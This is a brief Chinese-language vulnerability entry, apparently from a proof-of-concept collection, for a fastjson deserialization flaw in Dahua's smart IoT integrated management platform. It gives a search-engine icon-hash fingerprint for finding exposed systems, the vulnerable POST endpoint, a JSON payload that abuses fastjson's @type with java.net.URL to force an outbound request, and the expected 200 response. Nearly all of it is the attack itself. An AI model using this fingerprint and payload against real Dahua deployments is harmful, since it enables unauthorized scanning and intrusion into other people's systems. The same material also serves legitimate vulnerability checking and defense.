# 大华智能物联综合管理平台fastjson反序列化漏洞

大华 ｜ 反序列化 ｜ —
- **指纹**：`icon_hash="-1935899595"`
- **请求**：`POST /evo-runs/v1.0/auths/sysusers/random HTTP/2`

**Payload**
```
{"a":{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"java.net.URL","val":"http://www.baidu.com"}}""}
```
- **响应特征**：200